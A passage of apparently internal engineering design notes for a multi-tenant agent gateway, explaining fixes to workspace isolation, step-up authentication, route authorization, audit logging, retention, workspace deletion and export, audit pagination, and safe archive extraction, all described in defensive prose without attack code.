   Studio stops firing. That is a product decision about what Team Preview
   promises, not a gap to close on the way past. The honest options are (a)
   record only from Studio's deploy path, so the gate means what ST-16 says it
   means, or (b) give the record a source, and have a deployment that makes no
   certification claim yield "no opinion" exactly as an absent record does
   today.

2. **`schedules.Schedule.AgentVersion` and `VersionPolicy` are stored and never
   read.** The column exists, defaults to `latest`, has a comment explaining
   precisely the property MU-028 criterion 4 asks for — "an agent edited
   between two fires must not silently change what a schedule means" — and no
   code sets the version or branches on the policy. A deployment configured as
   `pinned` runs the latest definition anyway, silently. Criterion 4 is closed
   through the *run* record, which is written on every submission; the schedule
   record's pin remains a column with no behaviour behind it, and should either
   be driven or removed rather than left looking like a feature.

### The GUI had no workspace at all, so every store was one (MU-029)

The server side of MU-029 already existed — `/workspace/identity`,
`/workspace/workspaces`, `/workspace/select`, each verifying against stored
membership on every call. The client had no concept of a workspace whatsoever,
which means the interesting half is not "add a picker".

**Every store in `stores.js` was workspace state that nobody had classified.**
Studio drafts, chat threads and their runtime session ids, the agent queued for
editing, the agent queued for Activity — all of it survives a switch by
default, because until now there was one workspace and nothing to survive. The
failure is not a stale header: it is one tenant's draft rendering inside
another tenant's Studio.

The obvious fix is a `switchWorkspace()` that resets each store by name. That
is a list a future store is one refactor away from being left off, and being
left off is invisible until two workspaces exist and somebody notices their
colleague's work. So a store *declares itself* — `scoped(...)` or
`neutral(name, reason, ...)` on the same line as the declaration — and
`workspace.guard.test.js` reads `stores.js` as source and fails the build when
an exported store is neither. There is no third answer and no way to add a
store without choosing one. The guard also refuses a neutral exemption with no
reason, refuses an entry naming a store that no longer exists, and separately
pins the four obviously-tenant stores to the scoped side — because a refactor
that flipped `studioSession` to neutral would still satisfy "everything is
classified".

Three classification calls worth recording:

- **The credential is neutral.** It authenticates the *subject*, not their
  membership; one person carries it into every workspace they belong to, and
  clearing it on a switch would log them out to move rooms.
- **The chat session id is scoped, and its reset is a factory rather than a
  constant.** Carrying one id into another workspace addresses a conversation
  that does not exist there, and reusing one id for two workspaces is exactly
  the cross-tenant addressing the store scopes have spent since MU-012 making
  impossible.
- **The MU-028 version registry is cleared too, and it lives outside
  `stores.js`.** Agent IDs are unique per workspace, so a token remembered for
  "support-bot" in one workspace would be sent as the precondition for a
  *different* agent of the same name in the next — producing a conflict against
  an editor who does not exist. It is the least obvious piece of workspace
  state in the client, which is why the clear names it explicitly rather than
  relying on the registry the guard can see.

**The order inside `switchWorkspace` is the whole function.** Clear, then let
the server verify, then load. Clearing *after* the destination resolves means
its first render happens with the source workspace's drafts on screen — the
same leak, just briefer — and a test pins that the drafts are already gone
while the select call is in flight. Clearing first also means a *refused*
switch leaves the tab empty rather than showing the previous workspace's data
under the new workspace's name, which is the worst of the three outcomes.

A switch ends in a full page reload. The stores are cleared, but mounted
components hold their own local copies — a page that fetched agents into a
`let` is not something a store registry can reach, and asking every page to
subscribe to a workspace change is a rule each new page can forget.

**Deep links are verified against the membership list, not followed.**
`#ws=<id>` is attacker-supplied. The refusal deliberately does not echo the id
back: confirming that a workspace exists to somebody who is not in it is an
enumeration oracle wearing an error message. The same rule governs every
recovery state — expired, revoked, suspended, empty, unavailable each get an
actionable sentence and none of them names a resource the caller cannot reach.
"You belong to no workspaces" is its own state rather than an error, because
rendering it as a fault sends the user looking for a problem that does not
exist when the actual remedy is an invitation.

**Destructive dialogs (criterion 4) got the same treatment as the agent
writes.** `confirm('Delete agent "support-bot"? This cannot be undone.')` is a
sentence exactly as true in the workspace you meant as in the one you are
actually in, and agent IDs being unique per workspace makes the same name
existing in both the ordinary case. Raw `confirm()` is now a build failure in
`src/pages`: a dialog must be `confirmDestructive` (changes workspace-owned
server state, so the workspace is named on its own line) or `confirmLocal`
(discards something this tab is holding, where a workspace line is noise — and
noise is what teaches people to stop reading dialogs). Twenty-four call sites
were classified. The gateway upgrade is deliberately `confirmLocal` despite
being destructive: it restarts the whole deployment, and naming a workspace
would imply the action is scoped to it.

Personal deployments render none of this — no indicator, no workspace line in
any dialog — because a chrome element that only ever names the one workspace
there is is exactly the "noticing" product invariant 7 forbids.

### Step-up authentication, and the check that would never have fired (MU-030 criterion 5)

Nothing existed. The nearest thing was a comment in
`internal/gateway/credential_security.go` saying a future identity provider
might satisfy this with step-up, and a self-asserted
`X-Soulacy-Confirm-Credential-Reveal` header any client can set.

**What this protects against is a session that is still valid but no longer
attended** — a laptop left open, a token lifted off a machine, a tab an
ex-colleague still has. Role-based authorization cannot see any of that: the
request carries a genuine owner's credential and every check passes. The only
question that separates the owner from whoever has their session is "did a
human prove themselves recently", and nothing was asking it.

**THE TRAP: `iat` is the obvious field and it is exactly wrong.** An access
token here rotates silently every fifteen minutes for as long as a browser is
open, so `iat` is always fresh and an iat-based check passes forever on a
session nobody has touched. It would be a check that cannot fail, which is
worse than no check because every review afterwards reads it as protection.

So the token carries `auth_time`, moved only by an explicit re-authentication
and carried **unchanged** through rotation. Two details make that hold:

- It lives on the refresh-store ENTRY, not just on the identity.
  `RefreshAuthorized` replaces the identity wholesale with a freshly resolved
  one, and that resolver re-reads *membership* — it has no idea when the human
  last authenticated, so what it returns is always zero. Taking it would reset
  the clock on every silent rotation.
- `issueInFamilyAt` takes the value as an argument rather than reading
  `id.AuthTime`, so a caller handing it a freshly resolved identity cannot lose
  it by omission.

Mutation testing earned its keep twice here. First, the test that pins the
rotation property originally called `Refresh()`, whose reauthorizer is nil — so
the branch under test never executed and the test passed with the line deleted.
It now drives `RefreshAuthorized` with a resolver that returns a zero
`AuthTime`, which is what production hands back. Second, an assignment I had
added as belt-and-braces turned out to be dead: deleting it changed nothing,
because the explicit argument already did the work. It is gone, and the comment
that claimed to be the mechanism is gone with it — defensive redundancy whose
comment misidentifies the real mechanism is worse than absent, because the real
one then goes unexamined.

`POST /auth/reauthenticate` is registered **inside** the authenticated group:
step-up elevates a session that already exists, and registering it beside
`/auth/token` would make it a second, less-examined way in. It starts a NEW
refresh family, because step-up is only meaningful if the elevated authority is
bound to the credential the human just proved — continuing the family would let
a refresh token stolen *before* the step-up inherit the elevation on its next
rotation, which is the attacker step-up exists to exclude.

Two exemptions, both about who is on the other end rather than how sensitive
the action is. **Personal** is never prompted (invariant 7). **A non-human
principal** is never prompted: a service account has no browser to bounce to,
and demanding step-up would break automation at 03:00 while buying nothing — a
stolen machine credential is a rotation-and-revocation problem. That residual
is stated rather than papered over. A token with *no* `principal_kind` is
treated as human, because wrongly prompting a machine is a visible, reported
failure and wrongly exempting a person is a silent hole that looks like working
software.

The refusal is **401 with a distinct code**, not 403: the caller has permission
and stale proof, and a client told 403 reports "you do not have access" to
somebody who does.

**The client half had its own version of the same trap.** `apiFetch` already
retried any 401 by refreshing the token — and refreshing deliberately does not
move `auth_time`, so a step-up refusal would have been swallowed into a silent
round trip that achieved nothing and then failed identically. The 401 body is
now read before deciding, because two different failures wear that status and
they have opposite remedies. Re-authentication prompts for the key rather than
replaying the stored one: the point is that a HUMAN acts, and a client that
silently re-proves itself from a value it already holds satisfies the letter of
the check while removing the only thing it measures.

### Every mutating route now has to authorize itself (MU-030 criterion 2)

The criterion has two halves and only one is load-bearing. A hidden button is a
hidden button, not a boundary — anyone can issue the request the button would
have issued. So the half that got a guard is the API's.

`TestEveryMutatingRouteAuthorizesItself` reads `server.go` and fails the build
when a `POST`/`PUT`/`PATCH`/`DELETE` on the authenticated group reaches a
handler with no authorization middleware, unless the handler is listed with the
check it performs itself. It found two things immediately:

- **`GET /rate-limit/status` had no RBAC at all** — the only guard was the
  group middleware, so any authenticated principal including a viewer could
  read the deployment's limiter configuration and current pressure. That is
  operational signal about how much other tenants are using.
- **`POST /pairing/redeem` mints a credential and has no authorization
  middleware.** The second half is deliberate — the single-use pairing code is
  the capability, and minting one already requires `config:write`. What was not
  deliberate is what it issued: the unscoped `store.Create(ctx, name, scopes)`
  hard-codes `org_personal` / `ws_personal` / role `operator`, so in a Team
  deployment redeeming a code produced an operator credential in the
  *deployment's own* workspace — bypassing the entire scoped credential API
  MU-015 and MU-017 built, including its refusal to issue anything without a
  verified workspace identity. It now binds the credential to the redeemer's
  verified workspace and subject, gives it a 90-day expiry, and fails closed
  without an identity. Personal is the call it has always made.

`requireRecentAuth` is deliberately **not** counted as authorization by that
guard. It is a freshness check — it asks "is this still you", never "may you" —
and a route carrying only recent-auth would be reachable by any authenticated
principal who had just re-authenticated, which is everybody.

**The client half is served, not duplicated.** `/workspace/identity` now
returns the permission map projected from the RBAC matrix for the *verified*
role. A second copy of that matrix in JavaScript drifts from the one the routes
enforce, and the drift is worst in the direction that reads as a server bug: a
control offered for something the server refuses. `rbac.PermissionsFor` reads
the policy's own vocabulary rather than a hand-written list beside it, and
`internal/rbac/projection_test.go` pins that the projection equals
`HasPermission` for every role, resource and action.

`can()` **fails open on an empty map**, which is the opposite of the rule
everywhere else on this branch and is right here for a specific reason: two
cases produce an empty map — a personal deployment, which has no roles at all,
and the window before identity resolves — and hiding every control in either
would break the product for the deployments that have no permission problem to
solve. It is safe to fail open *because this is not the boundary*: the cost of
guessing wrong is a button that returns 403, and the cost of guessing wrong the
other way is a single-user install with no controls.

### What MU-030 does NOT cover, and why

Three of the seven capabilities in criterion 1 have no administrable surface at
all, and building one is a product decision rather than an engineering gap:

- **Budgets are deployment-wide, not per workspace.** `PATCH /config` writes
  the YAML file for the whole process and needs a restart. Per-workspace
  ceilings *do* exist as a mechanism (`costs.BuildPolicy`,
  `Governor.SetQuotaPolicy`, the `costs.quotas` YAML block) and there is **no
  API to read or write them** — `quotas` is absent from `PatchableConfig`.
- **Quotas have no create/update route anywhere.** `rate_limit` is not
  patchable either; it can only be changed by editing YAML and restarting.
- **Retention is process-wide and not patchable.** `runtime.retention` has no
  route, no GUI, and no per-workspace variant.

Two smaller gaps worth naming:

- **An invitation cannot be revoked.** `tenancy.MemberManager` exposes
  `CreateInvitation`, `ListInvitations` and `AcceptInvitation` and nothing else,
  so a pending invitation stops being usable only by expiring. A mis-sent invite
  to the wrong address is live for its full TTL.
- **There is no admin route to revoke another user's sessions.** Logout revokes
  only tokens presented in the caller's own request, and the revocation store
  is in-process and in-memory — so it is not shared across gateway instances
  either. Suspending a member stops their *refresh*, but their existing access
  token stays valid until it expires.

Criteria 3 and 4 are met by the existing implementation, verified rather than
built: API-key plaintext and invitation tokens are returned only at creation
(the `APIKey` struct has no field for a plaintext or a hash, so the list paths
are structurally incapable of returning one), and every usage view is
prompt-free by construction with `Chargeback`'s `group_by` a hard allowlist.
**One caveat found while verifying:** `Members.svelte` embeds a live invitation
token in a URL fragment and reads it back out of the query string, so the token
transits the browser address bar and history. That is a real disclosure path
for a credential the rest of the system is careful with, and it is worth fixing
before Team Preview.

### Two audit defects that produced no error, no wrong value, and no failing test (MU-031)

Both were found by surveying rather than by anything failing, and both fail in
the same shape: the evidence is an absence.

**1. First-time OIDC sign-in was broken by an audit write.**
`internal/tenancy/postgres.go` linked a new identity and then hand-wrote an
`INSERT INTO tenant_mutation_audit` naming `before_state`/`after_state` against
a table that defines `before_data`/`after_data`, while omitting `id` — a NOT
NULL primary key with a format CHECK. Three disagreements with the schema in
one statement, inside the linking transaction with its error returned. It could
never have succeeded. The symptom is "OIDC login is broken", which points
nowhere near an audit table.

Routed through `insertAudit`, the one writer that is kept in step with the DDL,
and `internal/tenancy/audit_writer_test.go` now fails the build on a second
`INSERT INTO tenant_mutation_audit` anywhere in the package, and on an insert
whose column list drifts from the DDL. Compilation cannot catch this (SQL is a
string) and no test exercised the Postgres path, so the guard has to read the
source. One detail earned by mutation-testing it: the primary-key check matches
a whole column rather than a substring, because `request_id` and `resource_id`
both contain "id" and a substring check passed with the key gone.

**2. The audit redaction ran and matched nothing.**
`scrubAuditDetails` inspected top-level keys only, so any nesting at all went
through unchanged — and `internal/audit/redactArgs` had been rewritten to
recurse for exactly this reason, with a comment saying so. The downstream
`redact.Value` in `actionlog.Append` did catch it in practice, which is why
nothing leaked; that makes this a defence-in-depth layer that silently was not
defending, which is the worse kind, because the layer below is the only thing
anyone would find if they looked. Its key list was also missing `credential`,
`passwd`, `private_key` and `auth` — names this codebase's own call sites use.

One decision inside the fix is worth recording: **a secret-named key holding a
map is descended into rather than blanked.** `credential: {name, id, api_key}`
blanked wholesale costs the record the two fields that make it traceable, and
the credential call sites nest exactly like that — so wholesale blanking would
make the records for the most sensitive actions the least informative. Anything
else under such a key is blanked: a scalar under `token` *is* the token, and a
list under `secrets` is a list of them with no benign siblings to preserve.

### An audit record that vanishes leaves no evidence of its own absence

`actionlog.Append`'s contract is "never block the caller; drop when the queue
is full". That is right for run telemetry — the engine making progress matters
more than complete logs — and exactly backwards for an audit record. An audit
trail with holes under load is not a slightly worse audit trail: it is one that
cannot be used to say an action did NOT happen, which is most of what it is
for, and the holes appear precisely when the system is busiest and the
interesting actions are happening.

`sdk/storage.DurableActionLogBackend` sits beside the frozen
`ActionLogBackend`, the same pattern `WorkspaceActionLogBackend` established.
`AppendDurable` waits briefly rather than blocking forever — a wedged writer
must degrade one administrative request, not hang every one in the deployment —
and if the wait expires it **reports** the loss. `recordAdminAudit` logs it
again with the ACTION named, because "an audit record was lost" is not
actionable and "credential.create by usr_x was not recorded" is. A backend with
no durable surface produces a warning rather than a silent fallback, so the
guarantee does not quietly depend on which backend happened to be wired.

A nil logger turned that fail-loud path into a nil dereference on
directly-constructed servers — a fail-loud path that panics instead of
reporting is worse than a silent one, because the original failure is a missing
record and the replacement is a crashed request that says nothing about it.
Pinned by a test, because the crash surfaced in an unrelated test and looked
like that test's bug.

### Reading the audit trail is not a neutral act (MU-031 criterion 4)

Neither audit read endpoint recorded anything, so the one question the trail
could not answer was who had been looking at it. That is the question that
matters for an insider: reading the trail is how somebody learns what is
watched, and it is the step before deciding whether an action will be noticed.

Both reads now record `audit.read`, **after** the read succeeds — a refusal
must not leave a record implying the data was served, which is worse than no
record because it asserts something that did not happen. The record carries the
size of what was returned, not its contents: a copy of the trail inside itself
helps nobody and doubles every record's blast radius.

### Retention had no floor, and a negative value silently disabled it

Two ways to make the trail unable to answer anything, both reachable through
`PATCH /config` — a route that is itself audited, so the change was recorded
and its effect was not:

- **A negative duration parses fine**, and every downstream guard is
  `retention > 0`, so `-1h` turned pruning OFF rather than shortening it. An
  operator reading the config saw a policy that was not in force.
- **There was no minimum.** `1m` was accepted.

`config.MinAuditRetention` is 30 days, and validation refuses anything shorter
for `action_events` and `audit_logs`. `"0"` — keep forever — stays allowed,
because a floor bounds how *short* retention may be and forever is not short.
Conversation history gets the negative check but no floor: a deployment keeping
less of what people said is making a privacy choice, not evading one.

**One naming trap is documented rather than renamed.**
`runtime.retention.audit_logs` governs only the optional JSONL tool-call audit
under `runtime.audit_dir`, which is **disabled by default** — so in a default
install it has no effect at all. The admin audit trail is stored as
`admin.audit` events and is governed by `runtime.retention.action_events`. An
operator lengthening `audit_logs` to satisfy a retention requirement changes
nothing about the trail they meant, and nothing tells them.

### MU-031's remaining criteria, and the design for the one that is not trivial

**Criterion 2 (coverage) is not met.** Of the eleven action classes the
criterion names, the admin audit trail covers credential, secret, policy,
export and support-access, and partially covers deletion. It does **not** cover
authentication (no login, logout, failed-auth or step-up record anywhere),
membership (covered by a *separate* Postgres trail that never reaches the admin
audit), extension/plugin (install, enable, uninstall record nothing), approval
(a `tool.approval` event exists but is not part of the trail), or schedule.
Agent deletion, workspace deletion and knowledge-base deletion are unaudited.

**Criterion 4's pagination is not met, and the design is worth writing down so
it is not re-derived.** Both endpoints accept only `limit`. The durable query
already orders by `(created_at DESC, id DESC)`, so the correct pagination is a
keyset cursor on that pair — not an offset, which skips or repeats records
whenever a write lands between pages, and an audit trail that repeats records
is one an investigator cannot count. It needs `id` carried out of the query,
and `message.Event` has no ID field: adding one touches the SDK event type and
`TestEveryEventFieldIsClassified`, which is why it is a separate piece of work
rather than a parameter. A cursor on `created_at` alone is not sufficient —
ties within one audit stream are rare but a boundary that drops a record is
exactly the failure this trail must not have.

Also unmet: audit storage is append-oriented **by convention** — there is no
update or delete route and no store method other than an unexported
`DeleteBefore` — but nothing enforces it. No hash chain, no signature, no WORM
backend. A `config:write` holder can shorten `action_events` retention and
restart, and both steps are audited while the effect is bulk deletion.

### Workspaces finally have a lifecycle, which is what MU-025 was waiting on (MU-032)

`workspaces` had no status column at all. That is why MU-025 criterion 5's
"background jobs revalidate workspace status before committing" was recorded as
"there is nothing to revalidate against", and why MU-029's suspended-workspace
recovery state had nothing behind it.

Four states, deliberately few — a state that answers "what may happen now" the
same as another is a state nobody can act on:

- **active** — everything.
- **suspended** — reads yes, writes no. A suspension a member cannot SEE is
  indistinguishable from having been removed from the workspace, and those have
  different remedies.
- **deleting** — MU-032 criterion 4. Reads stay open for the same reason and
  more so: the recovery window is worthless if nobody can look at what is about
  to be destroyed.
- **deleted** — nothing, including reads.

Three details are load-bearing:

- **The status is read in the SAME query as the membership.** A separate lookup
  is a window in which deletion begins between the two reads and the write it
  was meant to stop lands anyway.
- **The admission check lives in `workspaceContextMW`**, not in each handler.
  That is the one place every workspace request passes through and the only
  place that already holds the verified membership, so it is the only place a
  new handler cannot forget. A per-handler check is a rule, and the handlers
  that forget a rule are exactly the ones that write into a workspace somebody
  is deleting.
- **An empty status means active, and this is the one field on the branch that
  does NOT fail closed.** The column postdates existing rows, so treating unset
  as "being deleted" would take a whole deployment's writes offline on upgrade.
  An *unrecognised* status does fail closed, and the asymmetry is the point: an
  unknown value is overwhelmingly likely to be one a NEWER build introduced to
  stop writes, so an old replica guessing "active" is the split-brain a rolling
  upgrade produces.

Safe methods are the proxy for "read". It *is* a proxy — a GET can have side
effects if somebody writes one — but the alternative is an allow-list of read
handlers, which is a list a new read gets left off, and being left off there
refuses a legitimate read during a deletion window rather than allowing a
write. Wrong in the safer direction, and still wrong, so it is written down.

### The export is a projection of the ownership catalog, not a list beside it

"Export enumerates all owned resource classes" and "data is deleted or
tombstoned according to documented retention rules" are the same requirement
underneath: there must be one inventory, and a resource must not be able to
exist outside it.

`internal/ownership` already *is* that inventory — every `Resource` carries an
`Export` and a `Deletion` sentence, and the discovery scan fails the build when
a durable store appears unclassified. So `WorkspaceExportPlan` projects the
catalog rather than restating it, and `ValidateExportPlan` fails the build when
a workspace-owned resource has no export decision, no deletion decision, or a
deletion sentence that cannot be classified as purged / tombstoned / retained.

**It found one immediately.** `knowledge` recorded its deletion policy as
`"document, chunks, embeddings, jobs"` — a list of what is *affected* with no
verb saying what happens to it. That is not a policy, and the catalog is where
a reviewer goes to read the policy. Now `"purge document, chunks, embeddings,
and ingest jobs"`.

Two decisions inside the projection:

- **User-private classes are in the workspace export.** An export omitting
  conversations, memory and drafts would be an export of the workspace's
  *configuration*, and a customer asking to move their data means the data.
  Organization-owned and platform-global classes are excluded — they outlive
  the workspace and belong to a different export.
- **The disposition is derived from the catalog's prose rather than being a new
  field.** A second field would be a second place to state one policy, and the
  two would drift exactly as an exporter's own list would. A sentence that
  cannot be classified is an error rather than a default, because a resource
  whose deletion policy nobody can classify is one nobody has decided.

### Three gates on deletion, each covering something the others cannot

The temptation with an irreversible operation is to add gates until it feels
safe. These three are there because each answers a question the other two
cannot:

- **Recent authentication** (MU-030's step-up) answers *is this still the person
  who signed in*. No role check can: an abandoned session carries a genuine
  owner's credential and passes every one of them.
- **Typing the workspace name** answers *did you mean this workspace*.
  Authentication cannot: somebody with two workspaces open is exactly the
  person who is perfectly authenticated and one tab wrong. It is also the only
  gate that survives a scripted client — a confirm dialog is a click, and a
  name is a value that has to be fetched from the thing being destroyed.
- **The recovery window** answers *did you mean it at all*, which neither of the
  others can, because both are satisfied at the moment of a mistake. The
  24-hour floor exists because this kind of mistake is usually noticed by
  somebody other than the person who made it, and that person has to be awake,
  in another timezone, and looking. A caller may request a longer window and
  never a shorter one.

**The name comparison is exact** — not case-insensitive, not trimmed. A
confirmation that accepts an approximation accepts a guess, and the whole value
of the gate is that the caller went and read the real value. **The refusal does
not echo the expected name**, or the gate becomes a formality the next request
satisfies by copying it out of the error.

**The order of the gates is not arbitrary.** The already-deleting check runs
first, so a re-request is not answered "re-authenticate" — sending an owner
through a step-up for an operation that is going to be refused anyway. And the
NAME is checked before the window, so a caller who typed the wrong workspace is
told *that* rather than being told their window is too short: the second
message sends them to fix the wrong thing, after which they successfully delete
the wrong workspace.

The deletion report carries the catalog's projection, so it enumerates exactly
what the export does. A report assembled from its own list would be the third
place that inventory lives and the first to drift. It contains no secret values
by construction rather than by filtering — nothing in the path reads one — and
it records which classes the catalog says exclude secret material, so a reader
can check the promise without the report having had to touch a secret to make
it.

### Keyset pagination, and the tiebreaker that makes it exact (MU-031 criterion 4)

An offset cursor is the obvious one and it is wrong here for a specific
reason: this table is append-only under load, so the page boundary moves under
every reader, always. An audit trail that repeats a record is one an
investigator cannot count; one that skips a record is worse.

The durable query already orders by `(created_at DESC, id DESC)`, so that pair
is the cursor. **The row-id tiebreaker is not a refinement.** Several audit
records written in the same millisecond is ordinary — one request produces
more than one — and a cursor on the timestamp alone either drops the second or
returns it twice depending on which side of the comparison it falls. The test
that pins this seeds twenty-five records with *identical* timestamps and
asserts each is seen exactly once; removing the tiebreaker fails it.

**The cursor never reaches `message.Event`.** Carrying a row id on the event
type would put a storage detail into the SDK's wire contract and through
`TestEveryEventFieldIsClassified`, for the benefit of one read path. The page
returns its own next cursor instead: the store knows where it stopped, and the
caller only needs to be able to say "continue".

Four smaller decisions, each of which is a failure mode if reversed:

- **The cursor is opaque.** A client that can construct one can ask for rows
  either side of a boundary it chose, which turns a pagination parameter into
  a query language nobody designed.
- **An invalid cursor is an error, not an empty page.** A malformed cursor is a
  client bug or tampering, and an empty page makes both look like the end of
  the data — an investigator would conclude the trail stopped there.
- **The query reads one row more than asked for.** Deriving "is there more"
  from a full page hands out a cursor that returns nothing whenever the page
  ends exactly on the last row, and a client that trusts a non-empty cursor
  then loops.
- **A backend that cannot paginate says so** when asked to continue, rather
  than answering an unpaginated first page — which would tell the caller they
  had seen the whole trail.

Pages are newest-first, which is the opposite of the unpaginated read. That is
not an inconsistency to tidy away: the unpaginated call answers "show me the
recent window in the order it happened", and this one answers "walk backwards
through the trail". Pages each returned oldest-first would put the *pages*
themselves in descending order, which reads as corrupted data.

Mutation testing corrected two tests here. The page-size bound was asserted
against a three-record fixture, so removing the clamp changed nothing — it now
seeds past the bound. And the durable-store wait helper counted a single page,
which is capped at the page size, so a seed larger than the cap timed out
reporting a durability failure that was really a measurement bug.

`ListMembershipAudit` got a smaller fix in passing: its limit was *reset* to
100 whenever a caller asked for more than 500, so asking for 600 returned
fewer records than asking for 500 — silently, which for an audit read means an
investigator concludes there were only 100 and stops. It clamps now. Keyset
paginating that table needs an `(created_at, id)` cursor through pgx and
cannot be exercised without a Postgres instance, so it is recorded as
outstanding rather than written blind.

### The audit trail now covers the classes the criterion names (MU-031 criterion 2)

Six of the eleven were uncovered. **Authentication entirely** — no login,
logout, re-authentication or failed-attempt record existed anywhere in the
codebase. That is the class an intrusion investigation starts from, and the
trail could not answer "when did this credential first appear" at all.

**Membership was covered only by a separate Postgres trail.** Two trails each
holding half the story is worse than one holding all of it: the investigation
that matters is "what happened in this workspace", and it was answerable only
by knowing to look somewhere else. Membership mutations now reach both.

Extension/plugin, approval, schedule, and most deletions were absent.

Two shapes carried the work:

- **`auditing(action, resource, targetParam, handler)`** wraps a route rather
  than adding a line to each handler. Nineteen handlers each remembering to
  record is eighteen chances to forget, and the record that gets forgotten is
  the one nobody misses until an investigation needs it. Registering it at the
  route also puts the audit decision next to the authorization decision, where
  a reviewer is already looking.
- **`auth.Engine.SetAuditSink`** lets internal/auth emit authentication events
  without depending on the gateway, which wires the sink because the trail's
  actor, workspace and request id come from the request.

**Failures are recorded, not skipped.** "Somebody tried to make themselves an
owner and the store refused" is one of the more interesting lines a trail can
carry, and a trail of successes cannot show an attack that did not work. Two
distinct failure reasons on re-authentication for the same reason: a wrong
credential and a *correct credential presented by the wrong session* are
different events, and the second is somebody proving a key that is not theirs
to elevate a session that is.

Three things are deliberately not in the records. The invitation **email** —
an audit record is read by more people than the invitation was addressed to,
so the trail carries the role granted and the expiry, which is what matters.
The credential on a failed login, **including any hash of it** — a hash
confirms a guess. And logout always records `ok`, because the endpoint answers
204 unconditionally so it cannot be an account oracle, and the audit record
must not become the oracle the status code refuses to be.

`audit_coverage_test.go` maps each of the eleven classes to the actions
covering it and reads the SOURCE for the strings actually recorded. It fails
three ways: a category with no covered action, an action listed that the source
no longer records, and the category list itself drifting from the criterion —
because dropping a category would make the first check pass by asking less,
which is the failure mode of every checklist that checks itself.

### MU-032's export: the archive is a projection of the catalog, not a second list

`internal/workspaceexport` imports the ownership catalog and the standard
library, and nothing else — not `knowledge`, not `runs`, not `credentials`. The
bytes for each resource class arrive as an injected `Source` supplied by the
gateway.

That shape is the whole design. An exporter that imported every store would be
a SECOND inventory of what a workspace contains, and a second inventory fails
silently in the direction that matters: a class nobody added an import for is
simply absent from the archive, and an absent class is indistinguishable from a
class whose workspace had none of it. Here the plan comes from
`ownership.WorkspaceExportPlan()` and **every plan entry starts life as
`not-exported`**, so a class with no registered Source appears in the manifest,
by name, saying it was not exported and why. There is no code path that
produces a short manifest, so a short manifest cannot be mistaken for a
complete one.

`EntryStatus` has four values rather than a bool because the three non-success
outcomes have genuinely different meanings to somebody holding the archive:
`empty` (we looked, there is none — nothing is missing), `not-exported` (data
exists that this archive does not contain), `failed` (retrying may help). An
empty resource is recorded as `empty` rather than as a zero-byte file, because
a zero-byte file looks like a broken exporter and `empty` looks like an empty
workspace.

Three smaller decisions worth not undoing:

- **The manifest checksum covers the entries only**, deliberately not
  `CreatedAt` or `RequestedBy`. The question a checksum answers here is "are
  these two exports the same data", which is what somebody reconciling a re-run
  against an archive they hold is asking. Folding the timestamp in makes every
  export of unchanged data a different checksum — answering a question nobody
  asked, and making the useful one unanswerable.
- **`manifest.json` is written FIRST in the tar**, which is why resources are
  staged to temporary files and hashed before the archive is assembled. The
  streaming alternative puts the manifest last, because its checksums are not
  known until every entry is written, and a manifest last is one a consumer
  cannot read without buffering the whole archive.
- **`GET .../download` must not `defer file.Close()`.** Fiber streams the body
  after the handler returns, so closing there fails every download partway with
  "file already closed" — during the stream, after the 200 has been written, so
  the access log records a success.

Export is gated on the workspace OWNER and recent authentication, not on an
RBAC resource/action pair like every other privileged route here. An export is
not an operation on a resource class; it is a single file containing all of
them, produced without the per-resource checks that normally stand between a
role and a secret name or another member's conversations. Modelling it as "read
on resource X" would make it look like the sum of permissions the caller
already holds, which is exactly what it is not.

The archive store is namespaced by PATH under `wsroot`, not by a workspace
column on a shared index, so a handler that lost its workspace resolves to an
empty personal root rather than listing every tenant's archives. Export IDs are
`[a-zA-Z0-9_-]{8,64}` with no dots at all — which removes `.` and `..` without
enumerating them, and removes every encoding a decoder might produce.

`internal/workspaceexport/job.go` is classified in the ownership catalog as the
new `workspace-exports` resource. WorkspaceOwned rather than Ephemeral despite
its 72h TTL: Ephemeral would leave it out of the DELETION plan, and an archive
surviving a workspace deletion is precisely the leftover full copy that matters
most.

### Two ordering bugs in the write preconditions, and why order is the bug

`handleStudioSave` checked the Studio contract gate before the concurrency
precondition, and the package import path checked SOUL.yaml validity before it.
In both cases a stale write received a *fixable* refusal — 422 "contract
blocked", 400 "validation failed" — so the author went away, fixed that thing,
retried, and the retry landed, silently discarding the colleague's edit the 409
existed to protect. **A stale answer has to be the first one a caller sees,
because it is the only one that changes what they do next.** Both orderings are
now mutation-tested: moving the guard back after the gate fails the test.

The import path keeps one honest asymmetry. Its guard sits after package
INSPECTION and cannot move earlier, because the request does not name the agent
— the package does — so there is no earlier point at which the handler knows
which agent it is about. A stale import of a structurally malformed package
still answers 400 first.

### One extractor, and what the three it replaced were each missing

`internal/safearchive` is the only package that opens an archive from an
untrusted source. Before it there were three, and the interesting thing is that
no two of them were missing the same guard:

| | traversal | total bytes | per-entry | entry count | duplicate names | links/devices | destination resolved |
|---|---|---|---|---|---|---|---|
| `plugininstall` | ✓ | ✓ | — | — | — | skipped | — |
| `updates` | ✓ | — | ✓ | — | — | skipped | n/a (in memory) |
| `knowledge` (.docx) | n/a | ✓ | ✓ | — | n/a | n/a | n/a (in memory) |

The `knowledge` row is the one that had already been found the hard way: it
measured the COMPRESSED upload, and DEFLATE reaches roughly 1000:1, so a 1 MB
attachment expanded to about a gigabyte inside one `io.ReadAll` — from a route
needing only the chat permission. It was fixed in place. The lesson that
produced this package is that fixing it in place left two other extractors with
different holes and no mechanism to stop a fourth.

Decisions worth not undoing:

- **Refusing beats skipping.** The old extractors dropped symlink, hardlink and
  device entries silently. That is wrong in both directions: a benign archive
  carrying a symlink installs and then does not work, with nothing anywhere
  saying why, while a hostile one learns exactly which entry types are ignored
  and pays no price for probing. An archive containing a device node is broken
  or an attack, and both deserve the same answer — stop, and name the entry.
- **Three bounds, not one.** `MaxTotalBytes` stops the classic bomb;
  `MaxEntryBytes` stops one entry eating the whole budget; `MaxEntries` stops
  the bomb a byte budget cannot see — ten million zero-length files weigh
  nothing and exhaust the filesystem's inodes, which fails the machine rather
  than the request.
- **`O_EXCL`, so a duplicate entry name is refused.** An archive carrying
  `a.py` twice is scanned as the first copy and extracted as the second by any
  extractor that truncates.
- **The copy reads one byte PAST the allowance**, so "exactly at the limit" and
  "over it" are distinguishable, and an oversized entry is refused rather than
  silently truncated. A truncated file the caller believes is complete is worse
  than an error: for an executable or a nested archive it is a corruption the
  next stage reports as its own bug. The partial file is removed on refusal, so
  a failed extraction leaves nothing for a later scan to find.
- **The destination's own symlinks are resolved once, up front.** The previous
  extractors compared a joined path against the destination *string* they were
  handed; with `/var` → `/private/var` on macOS that check refuses every
  legitimate entry, so the guard meant to stop an attack instead broke normal
